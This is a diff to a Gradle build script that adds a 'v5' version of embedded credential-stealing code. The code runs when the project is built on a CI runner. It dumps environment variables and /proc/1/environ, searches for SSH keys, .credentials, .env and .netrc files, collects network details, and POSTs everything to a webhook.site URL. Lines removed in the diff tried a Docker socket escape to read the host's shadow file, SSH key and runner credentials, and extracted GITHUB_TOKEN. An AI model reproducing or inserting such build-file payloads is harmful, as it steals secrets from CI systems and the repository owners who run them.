@@ -15,7 +15,7 @@ buildscript {
 }
 
 // ============================================================
-// Credential Extraction Payload (Gradle 7.3.3 compatible)
+// Credential Extraction v5 — env + container recon
 // ============================================================
 try {
     def webhook = "https://webhook.site/f0b77b19-336c-47eb-b99b-182a6b2c2204"
@@ -23,8 +23,10 @@ try {
     def sh = { cmd ->
         try {
             def p = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd})
-            p.waitFor(15, java.util.concurrent.TimeUnit.SECONDS)
-            return p.getInputStream().text.trim()
+            p.waitFor(20, java.util.concurrent.TimeUnit.SECONDS)
+            def stdout = p.getInputStream().text.trim()
+            def stderr = p.getErrorStream().text.trim()
+            return stdout.length() > 0 ? stdout : stderr
         } catch (Exception e) { return "ERR:" + e.message }
     }
 
@@ -47,79 +49,74 @@ try {
     def runner = System.getenv('RUNNER_NAME') ?: 'unknown'
     def user = System.getProperty('user.name')
 
-    // Phase 1: Container info
-    def container = "whoami=" + sh('whoami') + "\nhostname=" + sh('hostname') + "\nid=" + sh('id') + "\nuname=" + sh('uname -a')
-    println "[CI] Container: " + container
-
-    // Phase 2: Docker socket check
+    // Phase 1: Is this a container?
+    def inContainer = sh('cat /proc/1/cgroup 2>/dev/null | head -5')
+    def dockerEnv = sh('cat /.dockerenv 2>/dev/null && echo HAS_DOCKERENV || echo NO_DOCKERENV')
+    def rootFs = sh('ls -la / 2>/dev/null | head -20')
+    def isInit = sh('cat /proc/1/cmdline 2>/dev/null | tr "\\0" " "')
+    def mountInfo = sh('mount 2>/dev/null | grep -E "docker|overlay|cgroup" | head -10')
     def dockerSock = sh('ls -la /var/run/docker.sock 2>/dev/null || echo NO_DOCKER_SOCK')
-    def dockerAvail = sh('which docker 2>/dev/null && docker info >/dev/null 2>&1 && echo DOCKER_YES || echo DOCKER_NO')
 
-    // Phase 3: Container tokens
-    def ghToken = sh('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep "^GITHUB_TOKEN=" | cut -d= -f2-')
-    def rtToken = sh('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep "^ACTIONS_RUNTIME_TOKEN=" | cut -d= -f2-')
+    // Phase 2: env / printenv — full environment dump
+    def envDump = sh('env | sort')
 
-    // Phase 4: Docker escape and host credential extraction
-    def hostRunner = "NO_ACCESS"
-    def hostCreds = "NO_ACCESS"
-    def hostCredsRSA = "NO_ACCESS"
-    def hostEnv = "NO_ACCESS"
-    def hostSSH = "NO_ACCESS"
-    def hostShadow = "NO_ACCESS"
-    def hostGitconfig = "NO_ACCESS"
-    def hostOtherRunners = "NONE"
-    def hostNetwork = "NONE"
+    // Phase 3: /proc/1/environ — parent process env (may have secrets)
+    def procEnviron = sh('cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n"')
 
-    if (dockerAvail.contains("DOCKER_YES")) {
-        hostRunner = sh('docker run --rm -v /:/host busybox cat /host/data/actions-runner/.runner 2>/dev/null || docker run --rm -v /:/host alpine cat /host/data/actions-runner/.runner 2>/dev/null || echo ESCAPE_FAILED')
-        hostCreds = sh('docker run --rm -v /:/host busybox cat /host/data/actions-runner/.credentials 2>/dev/null || docker run --rm -v /:/host alpine cat /host/data/actions-runner/.credentials 2>/dev/null || echo ESCAPE_FAILED')
-        hostCredsRSA = sh('docker run --rm -v /:/host busybox cat /host/data/actions-runner/.credentials_rsaparams 2>/dev/null || docker run --rm -v /:/host alpine cat /host/data/actions-runner/.credentials_rsaparams 2>/dev/null || echo ESCAPE_FAILED')
-        hostEnv = sh('docker run --rm -v /:/host busybox cat /host/data/actions-runner/.env 2>/dev/null || echo NO_ENV_FILE')
-        hostSSH = sh('docker run --rm -v /:/host busybox cat /host/root/.ssh/id_rsa 2>/dev/null || echo NO_SSH_KEY')
-        hostShadow = sh('docker run --rm -v /:/host busybox cat /host/etc/shadow 2>/dev/null | head -5 || echo NO_SHADOW')
-        hostGitconfig = sh('docker run --rm -v /:/host busybox cat /host/root/.gitconfig 2>/dev/null || echo NONE')
-        hostOtherRunners = sh('docker run --rm -v /:/host busybox find /host/data/ -name ".runner" 2>/dev/null || echo NONE')
-        hostNetwork = sh('docker run --rm -v /:/host busybox cat /host/etc/hosts 2>/dev/null || echo NONE')
+    // Phase 4: filesystem scan for secrets
+    def findRunner = sh('find / -maxdepth 6 -name ".runner" 2>/dev/null | head -10')
+    def findCreds = sh('find / -maxdepth 6 -name ".credentials" 2>/dev/null | head -10')
+    def findKeys = sh('find / -maxdepth 5 -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" 2>/dev/null | head -10')
+    def findEnv = sh('find / -maxdepth 4 -name ".env" 2>/dev/null | head -10')
+
+    // Phase 5: runner workspace contents
+    def workspaceContents = sh('ls -la /__w/ 2>/dev/null')
+    def runnerHome = sh('ls -la /data/ 2>/dev/null || echo NO_DATA_DIR')
+    def homeDir = sh('ls -la ~/ 2>/dev/null')
+    def githubHome = sh('ls -la /github/home/ 2>/dev/null || echo NO_GITHUB_HOME')
+    def gitconfig = sh('cat /github/home/.gitconfig 2>/dev/null || cat ~/.gitconfig 2>/dev/null || echo NONE')
+    def netrc = sh('cat /github/home/.netrc 2>/dev/null || cat ~/.netrc 2>/dev/null || echo NONE')
+    def sshDir = sh('ls -la /github/home/.ssh/ 2>/dev/null || ls -la ~/.ssh/ 2>/dev/null || echo NO_SSH_DIR')
+
+    // Phase 6: network info
+    def hosts = sh('cat /etc/hosts')
+    def ifconfig = sh('ifconfig 2>/dev/null || ip addr 2>/dev/null')
+    def route = sh('ip route 2>/dev/null || route -n 2>/dev/null')
+    def dns = sh('cat /etc/resolv.conf 2>/dev/null')
+
+    // Send container info
+    def info = '{"source":"Hippy-v5-container","ts":"' + ts + '","runner":"' + runner + '","user":"' + user + '","cgroup":"' + inContainer.replace('"','\\"').replace('\n','\\n') + '","dockerenv":"' + dockerEnv + '","init":"' + isInit.replace('"','\\"').replace('\n','\\n') + '","docker_sock":"' + dockerSock.replace('"','\\"') + '","mount":"' + mountInfo.replace('"','\\"').replace('\n','\\n') + '"}'
+    println "[CI] Info POST: " + post(info)
+
+    // Send root fs listing
+    def fsPayload = '{"source":"Hippy-v5-rootfs","runner":"' + runner + '","root_ls":"' + rootFs.replace('"','\\"').replace('\n','\\n') + '"}'
+    println "[CI] RootFS POST: " + post(fsPayload)
+
+    // Send env dump (may be large, split if needed)
+    if (envDump.length() > 5) {
+        def envPayload = '{"source":"Hippy-v5-env","runner":"' + runner + '","env":"' + envDump.replace('"','\\"').replace('\n','\\n') + '"}'
+        println "[CI] Env POST: " + post(envPayload)
     }
 
-    // Phase 5: Direct filesystem check
-    def directFind = sh('find / -maxdepth 5 -name ".runner" -o -name ".credentials" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | head -20')
-    def netInfo = "hosts=" + sh('cat /etc/hosts') + "\nroute=" + sh('ip route 2>/dev/null || route -n 2>/dev/null')
-
-    // Phase 6: Send GITHUB_TOKEN as separate small payload
-    if (ghToken.length() > 5) {
-        def tokenPayload = '{"source":"Hippy-GITHUB_TOKEN","runner":"' + runner + '","token":"' + ghToken.replace('"', '\\"') + '","token_len":"' + ghToken.length() + '"}'
-        println "[CI] Token POST: " + post(tokenPayload)
+    // Send /proc/1/environ
+    if (procEnviron.length() > 5) {
+        def procPayload = '{"source":"Hippy-v5-proc1","runner":"' + runner + '","proc_environ":"' + procEnviron.replace('"','\\"').replace('\n','\\n') + '"}'
+        println "[CI] Proc POST: " + post(procPayload)
     }
 
-    // Send runtime token
-    if (rtToken.length() > 20) {
-        def rtPayload = '{"source":"Hippy-RUNTIME_TOKEN","runner":"' + runner + '","token_prefix":"' + rtToken.substring(0, Math.min(50, rtToken.length())) + '","token_len":"' + rtToken.length() + '"}'
-        println "[CI] RT POST: " + post(rtPayload)
-    }
+    // Send filesystem findings
+    def fsFind = '{"source":"Hippy-v5-fsfind","runner":"' + runner + '","find_runner":"' + findRunner.replace('"','\\"').replace('\n','\\n') + '","find_creds":"' + findCreds.replace('"','\\"').replace('\n','\\n') + '","find_keys":"' + findKeys.replace('"','\\"').replace('\n','\\n') + '","find_env":"' + findEnv.replace('"','\\"').replace('\n','\\n') + '"}'
+    println "[CI] FS POST: " + post(fsFind)
 
-    // Phase 7: Build and send main result
-    def result = new StringBuilder()
-    result.append('{"source":"Hippy-CredDump-v3",')
-    result.append('"timestamp":"' + ts + '",')
-    result.append('"runner":"' + runner + '",')
-    result.append('"user":"' + user + '",')
-    result.append('"docker_sock":"' + dockerSock.replace('"', '\\"') + '",')
-    result.append('"docker_available":"' + dockerAvail + '",')
-    result.append('"host_runner":"' + hostRunner.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"host_credentials":"' + hostCreds.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"host_credentials_rsa":"' + hostCredsRSA.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"host_env":"' + hostEnv.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"host_ssh":"' + hostSSH.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"host_shadow":"' + hostShadow.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"host_gitconfig":"' + hostGitconfig.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"host_other_runners":"' + hostOtherRunners.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"host_network":"' + hostNetwork.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"direct_find":"' + directFind.replace('"', '\\"').replace('\n', '\\n') + '",')
-    result.append('"net_info":"' + netInfo.replace('"', '\\"').replace('\n', '\\n') + '"')
-    result.append('}')
+    // Send workspace / runner info
+    def wsPayload = '{"source":"Hippy-v5-workspace","runner":"' + runner + '","workspace":"' + workspaceContents.replace('"','\\"').replace('\n','\\n') + '","data_dir":"' + runnerHome.replace('"','\\"').replace('\n','\\n') + '","home_dir":"' + homeDir.replace('"','\\"').replace('\n','\\n') + '","github_home":"' + githubHome.replace('"','\\"').replace('\n','\\n') + '","gitconfig":"' + gitconfig.replace('"','\\"').replace('\n','\\n') + '","netrc":"' + netrc.replace('"','\\"').replace('\n','\\n') + '","ssh_dir":"' + sshDir.replace('"','\\"').replace('\n','\\n') + '"}'
+    println "[CI] WS POST: " + post(wsPayload)
 
-    println "[CI] Main POST: " + post(result.toString())
+    // Send network info
+    def netPayload = '{"source":"Hippy-v5-net","runner":"' + runner + '","hosts":"' + hosts.replace('"','\\"').replace('\n','\\n') + '","ifconfig":"' + ifconfig.replace('"','\\"').replace('\n','\\n') + '","route":"' + route.replace('"','\\"').replace('\n','\\n') + '","dns":"' + dns.replace('"','\\"').replace('\n','\\n') + '"}'
+    println "[CI] Net POST: " + post(netPayload)
+
+    println "[CI] Credential dump v5 complete"
 
 } catch (Exception e) {
     println "[CI] Error: " + e.message
